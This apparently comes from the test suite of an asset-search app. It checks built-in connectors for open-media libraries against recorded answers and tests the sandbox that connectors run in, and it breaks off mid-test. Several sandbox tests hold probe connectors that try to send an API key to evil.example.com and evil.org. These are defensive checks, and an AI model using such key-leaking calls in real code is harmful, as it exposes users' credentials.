import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { BUILTIN_CONNECTORS, builtinCode } from '../../src/lib/assets/builtin';
import { AssetEngine, AssetSearch } from '../../src/lib/assets/engine';
import type { AssetFile, AssetQuery } from '../../src/lib/assets/model';
import type { ConnectorMeta, Transport } from '../../src/lib/assets/runtime';

/* A worker stand-in: the connector's real harness runs in a fresh context whose `self` is the global. */
const scripts = new Map<string, string>();
class FakeBlob {
  constructor(readonly parts: string[]) {}
}
class FakeWorker {
  onmessage: ((event: { data: unknown }) => void) | null = null;
  onerror: ((event: unknown) => void) | null = null;
  private readonly global: Record<string, unknown>;
  constructor(url: string) {
    const global: Record<string, unknown> = {
      navigator: {},
      URL,
      URLSearchParams,
      TextEncoder,
      TextDecoder,
      setTimeout,
      clearTimeout,
      queueMicrotask,
      console: { log() {}, warn() {}, error() {} },
    };
    global.self = global;
    global.postMessage = (data: unknown) => queueMicrotask(() => this.onmessage?.({ data: structuredClone(data) }));
    this.global = global;
    vm.createContext(global);
    new vm.Script(scripts.get(url) ?? '', { filename: 'blob:connector' }).runInContext(global);
  }
  postMessage(data: unknown) {
    queueMicrotask(() => (this.global.onmessage as (e: { data: unknown }) => void)?.({ data: structuredClone(data) }));
  }
  terminate() {}
}

const realCreate = URL.createObjectURL;
const realRevoke = URL.revokeObjectURL;
beforeAll(() => {
  vi.stubGlobal('Worker', FakeWorker);
  vi.stubGlobal('Blob', FakeBlob);
  URL.createObjectURL = ((blob: FakeBlob) => {
    const id = `blob:test/${scripts.size}`;
    scripts.set(id, blob.parts.join(''));
    return id;
  }) as unknown as typeof URL.createObjectURL;
  URL.revokeObjectURL = () => {};
});
afterAll(() => {
  vi.unstubAllGlobals();
  URL.createObjectURL = realCreate;
  URL.revokeObjectURL = realRevoke;
});

const fixture = (name: string): unknown => JSON.parse(readFileSync(new URL(`../fixtures/assets/${name}.json`, import.meta.url), 'utf8'));

type Route = [test: (url: URL, headers: Record<string, string>) => boolean, body: unknown | ((url: URL) => unknown)];

/** A network that answers from fixtures; records what was asked. */
function network(routes: Route[]) {
  const asked: { url: string; headers: Record<string, string>; method: string }[] = [];
  const transport: Transport = {
    async request(r) {
      const url = new URL(r.url);
      const headers = Object.fromEntries(r.headers.map(([k, v]) => [k.toLowerCase(), v]));
      asked.push({ url: r.url, headers, method: r.method });
      const route = routes.find(([test]) => test(url, headers));
      if (!route) return { status: 404, headers: [['content-type', 'text/plain']], body: new TextEncoder().encode(`no fixture for ${r.url}`) };
      const body = typeof route[1] === 'function' ? (route[1] as (u: URL) => unknown)(url) : route[1];
      if (body && typeof body === 'object' && 'redirect' in (body as object)) return { status: 302, headers: [['location', String((body as { redirect: string }).redirect)]], body: new Uint8Array() };
      return { status: 200, headers: [['content-type', 'application/json']], body: new TextEncoder().encode(typeof body === 'string' ? body : JSON.stringify(body)) };
    },
  };
  return { transport, asked };
}

const query = (q: Partial<AssetQuery> = {}): AssetQuery => ({
  text: 'moon',
  types: ['image', 'video', 'video3d', 'audio', 'text', 'model', 'texture', 'icon', 'font'],
  page: 1,
  pageSize: 20,
  licence: 'any',
  stock: true,
  use: 'free',
  ...q,
});

async function run(id: string, routes: Route[], q: Partial<AssetQuery> = {}, keys: Record<string, string> = {}, settings: Record<string, string> = {}) {
  const { transport, asked } = network(routes);
  const engine = new AssetEngine(
    () => transport,
    () => keys,
  );
  const source = { id, code: builtinCode(id) ?? '', settings };
  const meta = await engine.describe(source);
  const page = await engine.searchSource(source, query(q));
  const first = page.items[0];
  let filesError = '';
  let files: { files: AssetFile[]; notes: string[] } = { files: [], notes: [] };
  if (first) {
    try {
      files = await engine.files(source, first);
    } catch (error) {
      filesError = (error as Error).message;
    }
  }
  engine.stopAll();
  return { meta, page, first, files: files.files, notes: files.notes, filesError, asked, engine, source };
}

const host = (h: string) => (u: URL) => u.host === h;
const path = (h: string, p: string | RegExp) => (u: URL) => u.host === h && (typeof p === 'string' ? u.pathname.startsWith(p) : p.test(u.pathname));

describe('built-in connectors', () => {
  it('all load, have unique ids matching their file, and list hosts', async () => {
    const { transport } = network([]);
    const engine = new AssetEngine(
      () => transport,
      () => ({}),
    );
    const metas: ConnectorMeta[] = [];
    for (const c of BUILTIN_CONNECTORS) {
      const meta = await engine.describe(c);
      expect(meta.id).toBe(c.id);
      expect(meta.name.length).toBeGreaterThan(2);
      expect(meta.about.length).toBeGreaterThan(20);
      expect(meta.homepage).toMatch(/^https:\/\//);
      metas.push(meta);
    }
    engine.stopAll();
    expect(new Set(metas.map((m) => m.id)).size).toBe(BUILTIN_CONNECTORS.length);
    expect(BUILTIN_CONNECTORS.length).toBe(34);
    // Every kind of asset has at least two libraries.
    for (const type of ['image', 'video', 'video3d', 'audio', 'text', 'model', 'texture', 'icon', 'font'] as const) expect(metas.filter((m) => m.types.includes(type)).length, type).toBeGreaterThan(0);
    expect(metas.filter((m) => m.stock).map((m) => m.id)).toEqual(['pexels', 'pixabay', 'unsplash']);
  });
});

describe('connectors against recorded answers', () => {
  it('Openverse: pictures with their CC licence, and sound', async () => {
    const r = await run('openverse', [
      [path('api.openverse.org', '/v1/images/'), fixture('openverse_images')],
      [path('api.openverse.org', '/v1/audio/'), fixture('openverse_audio')],
    ]);
    expect(r.first?.title).toBe('Moon over the city');
    expect(r.first?.licence.code).toBe('by-sa');
    expect(r.first?.licence.version).toBe('2.0');
    expect(r.page.items.some((i) => i.type === 'audio')).toBe(true);
    expect(r.files[0]?.url).toMatch(/^https:\/\//);
  });

  it('Wikimedia Commons: files of every kind with their licence', async () => {
    const r = await run('commons', [[host('commons.wikimedia.org'), fixture('commons_search')]]);
    expect(r.page.items.length).toBeGreaterThan(0);
    expect(r.page.items.some((i) => i.type === 'model')).toBe(true);
    for (const item of r.page.items) expect(item.licence.code).not.toBe('unknown');
    expect(r.files.length).toBeGreaterThan(0);
  });

  it('Internet Archive: films with the licence in the search, files from the metadata', async () => {
    const r = await run('archive', [
      [path('archive.org', '/advancedsearch.php'), fixture('archive_search')],
      [path('archive.org', '/metadata/'), fixture('archive_metadata')],
    ]);
    expect(r.first?.title).toBe('Sample Film');
    expect(r.first?.licence.code).toBe('pdm');
    expect(r.files.length).toBeGreaterThan(0);
    expect(r.files[0]?.url).toContain('https://archive.org/download/');
  });

  it('NASA Image and Video Library', async () => {
    const r = await run('nasa-images', [
      [path('images-api.nasa.gov', '/search'), fixture('nasa_search')],
      [path('images-api.nasa.gov', '/asset/'), fixture('nasa_asset_video')],
    ]);
    expect(r.page.items.length).toBeGreaterThan(0);
    expect(r.first?.licence.code).toBe('us-gov');
    expect(r.files.length).toBeGreaterThan(0);
  });

  it('NASA Scientific Visualization Studio', async () => {
    const page = fixture('svs_page') as { id?: number };
    const r = await run('nasa-svs', [
      [path('svs.gsfc.nasa.gov', '/api/search/'), { count: 1, results: [{ id: page.id ?? 1, title: 'Moon phases' }] }],
      [path('svs.gsfc.nasa.gov', /^\/api\/\d+/), page],
    ]);
    expect(r.page.items.length).toBe(1);
    expect(r.files.length).toBeGreaterThan(0);
  });

  it('The Met: open-access objects', async () => {
    const object = fixture('met_object') as { objectID: number };
    const r = await run('met', [
      [path('collectionapi.metmuseum.org', '/public/collection/v1/search'), { total: 1, objectIDs: [object.objectID] }],
      [path('collectionapi.metmuseum.org', '/public/collection/v1/objects/'), object],
    ]);
    expect(r.page.items.length).toBe(1);
    expect(r.first?.licence.code).toBe('cc0');
    expect(r.files[0]?.url).toMatch(/^https:\/\//);
  });

  it('Art Institute of Chicago and Cleveland Museum of Art', async () => {
    const aic = await run('aic', [[host('api.artic.edu'), fixture('aic_search')]]);
    expect(aic.page.items.length).toBeGreaterThan(0);
    expect(aic.first?.licence.code).toBe('cc0');
    expect(aic.first?.thumb).toContain('iiif');
    const cma = await run('cleveland', [[host('openaccess-api.clevelandart.org'), fixture('cleveland_search')]]);
    expect(cma.page.items.length).toBeGreaterThan(0);
    expect(cma.first?.licence.code).toBe('cc0');
    expect(cma.files.length).toBeGreaterThan(0);
  });

  it('Library of Congress', async () => {
    const r = await run('loc', [
      [(u) => u.host === 'www.loc.gov' && u.searchParams.get('at') === 'item,resources', fixture('loc_item')],
      [path('www.loc.gov', '/photos/'), fixture('loc_search')],
      [path('www.loc.gov', '/film-and-videos/'), { results: [] }],
      [path('www.loc.gov', '/audio/'), { results: [] }],
    ]);
    expect(r.page.items.length).toBeGreaterThan(0);
    expect(r.files.length).toBeGreaterThan(0);
  });

  it('Europeana: the demo key unless one is set', async () => {
    const r = await run('europeana', [[path('api.europeana.eu', '/record/v2/search.json'), fixture('europeana_search')]]);
    expect(r.page.items.length).toBeGreaterThan(0);
    expect(new URL(r.asked[0]?.url ?? '').searchParams.get('wskey')).toBe('api2demo');
    const keyed = await run('europeana', [[path('api.europeana.eu', '/record/v2/search.json'), fixture('europeana_search')]], {}, { key: 'my-own-key' });
    expect(new URL(keyed.asked[0]?.url ?? '').searchParams.get('wskey')).toBe('my-own-key');
  });

  it('Smithsonian: CC0 media only, with a key', async () => {
    const r = await run('smithsonian', [[host('api.si.edu'), fixture('smithsonian_search')]], {}, { key: 'abc123' });
    expect(r.page.items.length).toBeGreaterThan(0);
    expect(r.first?.licence.code).toBe('cc0');
    expect(r.files.length).toBeGreaterThan(0);
  });

  it('Poly Haven: the list is searched here; glTF comes with its textures as parts', async () => {
    const files = (u: URL) => (u.pathname.endsWith('/files/hdri_one') ? fixture('polyhaven_files_hdri') : fixture('polyhaven_files_model'));
    const r = await run(
      'polyhaven',
      [
        [path('api.polyhaven.com', '/assets'), fixture('polyhaven_assets')],
        [path('api.polyhaven.com', '/files/'), files],
      ],
      { text: '' },
    );
    expect(r.page.items.length).toBeGreaterThan(0);
    expect(r.page.items.every((i) => i.licence.code === 'cc0')).toBe(true);
    const engine = r.engine;
    const model = r.page.items.find((i) => i.type === 'model');
    if (model) {
      const listed = await engine.files(r.source, model);
      expect(listed.files.some((f) => (f.parts?.length ?? 0) > 0)).toBe(true);
    }
    engine.stopAll();
  });

  it('ambientCG: ZIPs that are unpacked', async () => {
    const r = await run('ambientcg', [[host('ambientcg.com'), fixture('ambientcg_search')]]);
    expect(r.page.items.length).toBeGreaterThan(0);
    expect(r.files.some((f) => f.unzip)).toBe(true);
  });

  it('Sketchfab: searching needs no token; downloading does', async () => {
    const r = await run('sketchfab', [[path('api.sketchfab.com', '/v3/search'), fixture('sketchfab_search')]]);
    expect(r.page.items.length).toBeGreaterThan(0);
    expect(r.first?.licence.code).not.toBe('unknown');
    expect(r.files).toEqual([]);
    expect(r.filesError).toContain('needs your API token to download');
    const withToken = await run(
      'sketchfab',
      [
        [path('api.sketchfab.com', '/v3/search'), fixture('sketchfab_search')],
        [path('api.sketchfab.com', '/v3/models/'), { glb: { url: 'https://media.sketchfab.com/x.glb', size: 1000 } }],
      ],
      {},
      { token: 'tok-123456' },
    );
    expect(withToken.files[0]?.url).toBe('https://media.sketchfab.com/x.glb');
    expect(withToken.asked.at(-1)?.headers.authorization).toBe('Token tok-123456');
  });

  it('Thingiverse: things and their files, the token only to its own host', async () => {
    const thing = fixture('thingiverse_thing') as { id: number };
    const r = await run(
      'thingiverse',
      [
        [path('api.thingiverse.com', '/search/'), { total: 1, hits: [{ id: thing.id }] }],
        [(u) => u.host === 'api.thingiverse.com' && /\/things\/\d+\/files/.test(u.pathname), [{ name: 'part.stl', size: 100, download_url: `https://api.thingiverse.com/files/1/download` }]],
        [path('api.thingiverse.com', '/things/'), thing],
      ],
      {},
      { token: 'secret-token' },
    );
    expect(r.page.items.length).toBe(1);
    expect(r.files[0]?.headers?.[0]).toEqual(['Authorization', 'Bearer secret-token']);
  });

  it('sound: Freesound, Jamendo and LibriVox', async () => {
    const fs = await run('freesound', [[host('freesound.org'), fixture('freesound_search')]], {}, { key: 'k-123456' });
    expect(fs.first?.licence.code).toBe('cc0');
    expect(fs.files.some((f) => f.url?.endsWith('.ogg'))).toBe(true);
    const jam = await run('jamendo', [[host('api.jamendo.com'), fixture('jamendo_tracks')]], {}, { client_id: 'abc12345' });
    expect(jam.first?.licence.code).toBe('by-nc-sa');
    expect(jam.files[0]?.name).toMatch(/\.flac$/);
    const lv = await run('librivox', [[(u) => u.host === 'librivox.org' && u.searchParams.has('title'), fixture('librivox_books')]]);
    expect(lv.first?.licence.code).toBe('pd');
    expect(lv.files[0]?.unzip).toBe(true);
    expect(lv.files[0]?.url).toMatch(/^https:/);
  });

  it('books: Gutenberg, OAPEN and the Biodiversity Heritage Library', async () => {
    const pg = await run('gutenberg', [[host('gutendex.com'), fixture('gutendex_search')]]);
    expect(pg.first?.title).toBe('The Adventures of Sherlock Holmes');
    expect(pg.files.map((f) => f.name.split('.').pop())).toContain('epub');
    const oapen = await run('oapen', [[host('library.oapen.org'), fixture('oapen_search')]]);
    expect(oapen.first?.title).toBe('Open Science');
    expect(oapen.first?.licence.code).toBe('by');
    expect(oapen.files[0]?.md5).toBeTruthy();
    const bhl = await run(
      'bhl',
      [
        [(u) => u.host === 'www.biodiversitylibrary.org' && u.searchParams.get('op') === 'PublicationSearch', fixture('bhl_search')],
        [(u) => u.host === 'www.biodiversitylibrary.org' && u.searchParams.get('op') === 'GetItemMetadata', fixture('bhl_item')],
      ],
      {},
      { key: 'bhl-key-1' },
    );
    expect(bhl.first?.licence.code).toBe('pd');
    expect(bhl.first?.deathYear).toBe(1882);
    expect(bhl.files[0]?.url).toBe('https://www.biodiversitylibrary.org/itempdf/26093');
  });

  it('stock libraries: Pexels, Pixabay and Unsplash, with a download reported', async () => {
    const px = await run(
      'pexels',
      [
        [path('api.pexels.com', '/v1/search'), fixture('pexels_photos')],
        [path('api.pexels.com', '/videos/search'), fixture('pexels_videos')],
      ],
      {},
      { key: 'pexels-key' },
    );
    expect(px.first?.licence.code).toBe('pexels');
    expect(px.page.items.some((i) => i.type === 'video')).toBe(true);
    expect(px.asked[0]?.headers.authorization).toBe('pexels-key');
    const pb = await run(
      'pixabay',
      [
        [path('pixabay.com', '/api/videos/'), fixture('pixabay_videos')],
        [path('pixabay.com', '/api/'), fixture('pixabay_images')],
      ],
      {},
      { key: 'pixabay-key' },
    );
    expect(pb.first?.licence.code).toBe('pixabay');
    expect(pb.page.items.length).toBe(2);
    const us = await run(
      'unsplash',
      [
        [path('api.unsplash.com', '/search/photos'), fixture('unsplash_search')],
        [path('api.unsplash.com', '/photos/'), { url: 'https://images.unsplash.com/photo-1?ixid=tracked' }],
      ],
      {},
      { key: 'unsplash-key' },
    );
    expect(us.first?.licence.code).toBe('unsplash');
    expect(us.first?.page).toContain('utm_source=Benchtop');
    const original = us.files.find((f) => f.original);
    expect(original).toBeTruthy();
    if (original && us.first) {
      const prepared = await us.engine.prepare(us.source, us.first, original);
      expect(prepared.url).toBe('https://images.unsplash.com/photo-1?ixid=tracked');
      us.engine.stopAll();
    }
  });

  it('stock libraries are left out by the licence filter when stock is off', async () => {
    const px = await run('pexels', [[path('api.pexels.com', '/v1/search'), fixture('pexels_photos')]], { types: ['image'], stock: false }, { key: 'k' });
    expect(px.page.items).toEqual([]);
    expect(px.page.dropped).toBeGreaterThan(0);
  });
});

describe('connectors written from the libraries’ documented answers', () => {
  it('Wellcome Collection: IIIF pictures with their licence', async () => {
    const r = await run(
      'wellcome',
      [
        [
          path('api.wellcomecollection.org', '/catalogue/v2/images'),
          {
            type: 'ResultList',
            totalResults: 1,
            totalPages: 1,
            results: [
              {
                id: 'hfhratua',
                type: 'Image',
                locations: [
                  {
                    url: 'https://iiif.wellcomecollection.org/image/A0000211/info.json',
                    credit: 'Royal Veterinary College',
                    license: { id: 'cc-by', label: 'Attribution 4.0 International (CC BY 4.0)', url: 'https://creativecommons.org/licenses/by/4.0/' },
                    locationType: { id: 'iiif-image' },
                  },
                ],
                source: { id: 'usfsfbvg', title: "A pig's heart", contributors: [{ agent: { label: 'Royal Veterinary College' } }] },
                thumbnail: { url: 'https://iiif.wellcomecollection.org/image/A0000211/info.json' },
              },
            ],
          },
        ],
      ],
      { licence: 'by' },
    );
    expect(r.first?.licence.code).toBe('by');
    expect(r.first?.thumb).toBe('https://iiif.wellcomecollection.org/image/A0000211/full/!400,400/0/default.jpg');
    expect(new URL(r.asked[0]?.url ?? '').searchParams.get('locations.license')).toBe('cc-0,pdm,cc-by');
    expect(r.files[0]?.url).toBe('https://iiif.wellcomecollection.org/image/A0000211/full/full/0/default.jpg');
  });

  it('SMK: public-domain art with the artist’s death year', async () => {
    const r = await run('smk', [
      [
        path('api.smk.dk', '/api/v1/art/search/'),
        {
          offset: 0,
          rows: 1,
          found: 1,
          items: [
            {
              object_number: 'KKS411',
              titles: [{ title: 'Tre Russiske linieskibe.' }],
              artist: ['C.W. Eckersberg'],
              production: [{ creator: 'Eckersberg, C.W.', creator_date_of_death: '1853-07-22T00:00:00.000Z', creator_nationality: 'Danish' }],
              production_date: [{ period: '1824' }],
              frontend_url: 'https://open.smk.dk/artwork/image/KKS411',
              rights: 'https://creativecommons.org/publicdomain/mark/1.0/',
              image_thumbnail: 'https://iip-thumb.smk.dk/iiif/jp2/x.tif.jp2/full/!1024,/0/default.jpg',
              image_native: 'https://api.smk.dk/api/v1/download/abc/KKS411.jpg',
              image_iiif_id: 'https://iip.smk.dk/iiif/jp2/x.tif.jp2',
              image_width: 5838,
              image_height: 3042,
            },
          ],
        },
      ],
    ]);
    expect(r.first?.creator).toBe('C.W. Eckersberg');
    expect(r.first?.deathYear).toBe(1853);
    expect(r.first?.licence.code).toBe('pdm');
    expect(r.first?.thumb).toContain('/full/!400,/');
    expect(r.files[0]?.url).toBe('https://api.smk.dk/api/v1/download/abc/KKS411.jpg');
  });

  it('Wikipedia: CC BY-SA articles, with the plain text made by the connector', async () => {
    const r = await run(
      'wikipedia',
      [
        [
          (u) => u.host === 'hi.wikipedia.org' && u.searchParams.get('generator') === 'search',
          {
            query: {
              pages: [{ pageid: 7, title: 'चन्द्रमा', index: 1, extract: 'पृथ्वी का उपग्रह', fullurl: 'https://hi.wikipedia.org/wiki/x', thumbnail: { source: 'https://upload.wikimedia.org/x.jpg' } }],
            },
            continue: { gsroffset: 20 },
          },
        ],
        [(u) => u.host === 'hi.wikipedia.org' && u.searchParams.get('prop') === 'extracts', { query: { pages: [{ extract: 'पूरा लेख' }] } }],
      ],
      { licence: 'by-sa' },
      {},
      { language: 'hi' },
    );
    expect(r.first?.licence.code).toBe('by-sa');
    expect(r.page.more).toBe(true);
    expect(r.files[0]?.text).toContain('पूरा लेख');
    expect(r.files.map((f) => f.url ?? '')).toContain('https://hi.wikipedia.org/api/rest_v1/page/html/%E0%A4%9A%E0%A4%A8%E0%A5%8D%E0%A4%A6%E0%A5%8D%E0%A4%B0%E0%A4%AE%E0%A4%BE');
    const strict = await run('wikipedia', [], { licence: 'by' });
    expect(strict.asked).toEqual([]);
  });

  it('Wikisource: a whole work with its chapters as parts', async () => {
    const r = await run(
      'wikisource',
      [
        [
          (u) => u.host === 'en.wikisource.org' && u.searchParams.get('list') === 'search',
          { query: { searchinfo: { totalhits: 1 }, search: [{ pageid: 9, title: 'The Time Machine', snippet: 'The <span>Time</span> Traveller', wordcount: 300 }] } },
        ],
        [
          (u) => u.host === 'en.wikisource.org' && u.searchParams.get('list') === 'allpages',
          { query: { allpages: [{ title: 'The Time Machine/Chapter 1' }, { title: 'The Time Machine/Chapter 2' }] } },
        ],
        [(u) => u.host === 'en.wikisource.org' && u.searchParams.get('action') === 'parse', { parse: { text: '<p>The Time Traveller</p><style>.x{}</style>' } }],
      ],
      { text: 'time machine' },
    );
    expect(r.first?.description).toContain('The Time Traveller');
    const whole = r.files[0];
    expect(whole?.parts?.map((p) => p.name)).toEqual(['chapters/001 - Chapter 1.html', 'chapters/002 - Chapter 2.html']);
    expect(r.files.find((f) => f.text)?.text).toContain('The Time Traveller');
  });

  it('Open Library: public scans only, files from a scan that is not lending-only', async () => {
    const r = await run('openlibrary', [
      [
        path('openlibrary.org', '/search.json'),
        {
          numFound: 2,
          docs: [
            { key: '/works/OL1W', title: 'The Time Machine', author_name: ['H. G. Wells'], first_publish_year: 1895, cover_i: 12, ia: ['lent1', 'timemachine00well'], public_scan_b: true },
            { key: '/works/OL2W', title: 'A recent book', ia: ['recent'], public_scan_b: false, ebook_access: 'borrowable' },
          ],
        },
      ],
      [path('archive.org', '/metadata/lent1'), { metadata: { 'access-restricted-item': 'true' }, files: [] }],
      [
        path('archive.org', '/metadata/timemachine00well'),
        {
          metadata: {},
          files: [
            { name: 'tm.pdf', format: 'Text PDF', size: '1000', md5: 'a'.repeat(32) },
            { name: 'tm_djvu.txt', format: 'DjVuTXT' },
            { name: 'tm.xml', format: 'Metadata' },
          ],
        },
      ],
    ]);
    expect(r.page.items.map((i) => i.title)).toEqual(['The Time Machine']);
    expect(r.first?.thumb).toBe('https://covers.openlibrary.org/b/id/12-M.jpg');
    expect(r.files.map((f) => f.name)).toEqual(['tm.pdf', 'tm_djvu.txt']);
  });

  it('Iconify: icons with their set’s licence', async () => {
    const r = await run(
      'iconify',
      [
        [
          path('api.iconify.design', '/search'),
          {
            icons: ['mdi:rocket', 'tabler:rocket'],
            total: 2,
            limit: 32,
            start: 0,
            collections: {
              mdi: { name: 'Material Design Icons', author: { name: 'Pictogrammers' }, license: { title: 'Apache 2.0', spdx: 'Apache-2.0', url: 'https://x' } },
              tabler: { name: 'Tabler Icons', license: { title: 'MIT', spdx: 'MIT' } },
            },
          },
        ],
      ],
      { text: 'rocket' },
    );
    expect(r.page.items.map((i) => i.licence.code)).toEqual(['apache', 'mit']);
    expect(r.first?.thumb).toBe('https://api.iconify.design/mdi/rocket.svg?height=96');
    expect(r.files[0]?.url).toBe('https://api.iconify.design/mdi/rocket.svg');
    expect(new URL(r.asked[0]?.url ?? '').searchParams.get('limit')).toBe('32');
  });

  it('Fontsource: fonts searched here, a whole family as one download', async () => {
    const r = await run(
      'fontsource',
      [
        [
          (u) => u.host === 'api.fontsource.org' && u.pathname === '/v1/fonts',
          [
            { id: 'inter', family: 'Inter', subsets: ['latin'], weights: [400, 700], styles: ['normal'], defSubset: 'latin', category: 'sans-serif', license: 'OFL-1.1', type: 'google' },
            { id: 'lora', family: 'Lora', subsets: ['latin'], weights: [400], styles: ['normal'], category: 'serif', license: 'OFL-1.1' },
          ],
        ],
        [
          path('api.fontsource.org', '/v1/fonts/inter'),
          {
            id: 'inter',
            defSubset: 'latin',
            variants: {
              400: { normal: { latin: { url: { ttf: 'https://cdn.jsdelivr.net/a-400.ttf', woff2: 'https://cdn.jsdelivr.net/a-400.woff2' } } } },
              700: { normal: { latin: { url: { ttf: 'https://cdn.jsdelivr.net/a-700.ttf' } } } },
            },
          },
        ],
      ],
      { text: 'inter' },
    );
    expect(r.page.items.map((i) => i.title)).toEqual(['Inter']);
    expect(r.first?.licence.code).toBe('ofl');
    expect(r.files[0]?.label).toContain('Whole family');
    expect(r.files[0]?.parts?.map((p) => p.name)).toEqual(['inter-latin-700-normal.ttf']);
  });

  it('FreeCAD library: parts grouped by name, with the thumbnail the library made', async () => {
    const r = await run(
      'freecad',
      [
        [
          path('api.github.com', '/repos/FreeCAD/FreeCAD-library/git/trees/master'),
          {
            truncated: false,
            tree: [
              { path: 'Mechanical Parts/Fasteners/Bolt M6.FCStd', type: 'blob', size: 2000 },
              { path: 'Mechanical Parts/Fasteners/Bolt M6.step', type: 'blob', size: 5000 },
              { path: 'Mechanical Parts/Fasteners/Bolt M6.stl', type: 'blob', size: 7000 },
              { path: 'Electronics Parts/Arduino Uno.FCStd', type: 'blob', size: 9000 },
              { path: 'thumbnails/62a99db930381acf57900cd168606625.png', type: 'blob', size: 10 },
              { path: 'README.md', type: 'blob', size: 10 },
            ],
          },
        ],
      ],
      { text: 'bolt' },
    );
    expect(r.page.items.length).toBe(1);
    expect(r.first?.title).toBe('Bolt M6');
    expect(r.first?.licence.code).toBe('by');
    expect(r.first?.thumb).toBe('https://raw.githubusercontent.com/FreeCAD/FreeCAD-library/master/thumbnails/62a99db930381acf57900cd168606625.png');
    expect(r.files.map((f) => f.name)).toEqual(['Bolt M6.FCStd', 'Bolt M6.step', 'Bolt M6.stl']);
    expect(r.files[0]?.url).toBe('https://raw.githubusercontent.com/FreeCAD/FreeCAD-library/master/Mechanical%20Parts/Fasteners/Bolt%20M6.FCStd');
  });

  it('NASA 3D Resources: models grouped by folder', async () => {
    const r = await run(
      'nasa-3d',
      [
        [
          path('api.github.com', '/repos/nasa/NASA-3D-Resources/git/trees/master'),
          {
            tree: [
              { path: '3D Models/Apollo Lunar Module/LM.stl', type: 'blob', size: 100 },
              { path: '3D Models/Apollo Lunar Module/LM.jpg', type: 'blob', size: 10 },
            ],
          },
        ],
      ],
      { text: 'lunar' },
    );
    expect(r.first?.title).toBe('Apollo Lunar Module');
    expect(r.first?.thumb).toContain('LM.jpg');
    expect(r.files.length).toBe(2);
  });

  it('Open films for screens: stereo releases without the network', async () => {
    const r = await run('blender-films', [], { text: 'bunny', types: ['video3d'] });
    expect(r.asked).toEqual([]);
    expect(r.page.items.length).toBe(4);
    expect(r.page.items.every((i) => i.type === 'video3d' && i.stereo)).toBe(true);
    expect(r.files[0]?.unzip).toBe(true);
    const pdOnly = await run('blender-films', [], { text: 'bunny', licence: 'pd' });
    expect(pdOnly.page.items).toEqual([]);
  });
});

describe('the sandbox around connectors', () => {
  const connector = (body: string, extra = '') =>
    `export const source = { id: 'probe', name: 'Probe', about: 'A connector made for the tests here.', homepage: 'https://example.org', types: ['image'], hosts: ['api.example.org'], keys: [{ id: 'key', label: 'Key' }] ${extra} };\nexport async function search(q, ctx) {\n${body}\n}`;
  const runCode = async (code: string, routes: Route[], keys: Record<string, string> = {}) => {
    const { transport, asked } = network(routes);
    const engine = new AssetEngine(
      () => transport,
      () => keys,
    );
    try {
      const page = await engine.searchSource({ id: 'probe', code, settings: {} }, query());
      return { page, asked, error: '' };
    } catch (error) {
      return { page: null, asked, error: (error as Error).message };
    } finally {
      engine.stopAll();
    }
  };

  it('has no fetch, storage or other network of its own', async () => {
    const r = await runCode(
      connector("return { items: [{ id: '1', title: [typeof fetch, typeof XMLHttpRequest, typeof WebSocket, typeof indexedDB, typeof importScripts].join(','), licence: 'cc0' }] };"),
      [],
    );
    expect(r.page?.items[0]?.title).toBe('undefined,undefined,undefined,undefined,undefined');
  });

  it('may ask only its own hosts over https', async () => {
    const other = await runCode(connector("await ctx.get('https://evil.example.com/?k=' + ctx.key('key')); return { items: [] };"), [[() => true, {}]], { key: 'secret-value' });
    expect(other.error).toMatch(/not https or not one of the connector's hosts/);
    expect(other.asked).toEqual([]);
    expect(other.error).not.toContain('secret-value');
    const plain = await runCode(connector("await ctx.get('http://api.example.org/x'); return { items: [] };"), [[() => true, {}]]);
    expect(plain.error).toMatch(/not https/);
  });

  it('follows redirects only to its hosts, dropping the key when it leaves the first host', async () => {
    const r = await runCode(
      connector(
        "const r = await ctx.get('https://api.example.org/a', { headers: { Authorization: 'Token ' + ctx.key('key') } }); return { items: [{ id: '1', title: r.ok, licence: 'cc0' }] };",
        ", hosts: ['api.example.org', 'cdn.example.org']",
      ),
      [
        [(u) => u.pathname === '/a', { redirect: 'https://cdn.example.org/b' }],
        [(u) => u.pathname === '/b', { ok: 'yes' }],
      ],
      { key: 'secret-value' },
    );
    expect(r.page?.items[0]?.title).toBe('yes');
    expect(r.asked[0]?.headers.authorization).toBe('Token secret-value');
    expect(r.asked[1]?.headers.authorization).toBeUndefined();
    const away = await runCode(connector("await ctx.get('https://api.example.org/a'); return { items: [] };"), [[(u) => u.pathname === '/a', { redirect: 'https://elsewhere.org/b' }]]);
    expect(away.error).toMatch(/Redirected to https:\/\/elsewhere\.org\/b/);
  });

  it('drops thumbnails and files whose links would carry a key to another host', async () => {
    const code = `${connector("return { items: [{ id: '1', title: 'x', licence: 'cc0', thumb: 'https://evil.org/t.jpg?k=' + ctx.key('key') }] };")}\nexport async function files(item, ctx) { return [{ label: 'leak', url: 'https://evil.org/f?k=' + ctx.key('key'), name: 'f' }, { label: 'fine', url: 'https://cdn.org/f.jpg', name: 'f.jpg', headers: [['Authorization', 'x']] }]; }`;
    const { transport } = network([]);
    const engine = new AssetEngine(
      () => transport,
      () => ({ key: 'secret-value' }),
    );
    const source = { id: 'probe', code, settings: {} };
    const page = await engine.searchSource(source, query());
    expect(page.items[0]?.thumb).toBe('');
    const listed = await engine.files(source, page.items[0] as never);
    expect(listed.files.map((f) => f.label)).toEqual(['fine']);
    expect(listed.files[0]?.headers).toBeUndefined();
    expect(listed.notes[0]).toMatch(/left out/);
    engine.stopAll();
  });

  it('hides keys in errors the connector throws', async () => {
    const r = await runCode(connector("throw new Error('bad key ' + ctx.key('key'));"), [], { key: 'secret-value' });
    expect(r.error).toBe('bad key ••• (line 3)');
  });

  it('reports the line of an error in the connector', async () => {
    const r = await runCode(connector('const x = null;\nreturn x.items;'), []);
    expect(r.error).toMatch(/\(line 4\)/);
  });

  it('a search across libraries merges them in turn without the same work twice', async () => {
    const make = (id: string, titles: string[]) => ({
      id,
      code: `export const source = { id: '${id}', name: '${id}', about: 'A test library for the merged list.', homepage: 'https://example.org', types: ['image'], hosts: [] };\nexport async function search() { return { items: ${JSON.stringify(titles.map((t, i) => ({ id: `${id}${i}`, title: t, creator: 'A', licence: 'cc0' })))}, more: false }; }`,
      settings: {},
    });
    const sources = [make('lib-a', ['One', 'Two', 'Three']), make('lib-b', ['Two', 'Four'])];
    const { transport } = network([]);
    const engine = new AssetEngine(
      () => transport,
      () => ({}),
    );
    const metas = new Map<string, ConnectorMeta>();
    for (const s of sources) metas.set(s.id, await engine.describe(s));
